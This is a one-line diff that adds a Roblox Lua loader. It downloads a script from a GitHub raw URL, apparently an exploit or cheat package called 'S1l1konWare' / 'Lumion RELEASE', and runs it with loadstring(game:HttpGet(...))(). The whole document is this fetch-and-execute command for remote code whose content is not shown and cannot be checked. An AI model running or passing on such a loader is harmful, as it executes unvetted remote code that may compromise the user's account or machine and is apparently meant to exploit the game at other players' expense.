@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/Adedsxxmany/S1l1konWare/refs/heads/main/Lumion%20RELEASE'))()
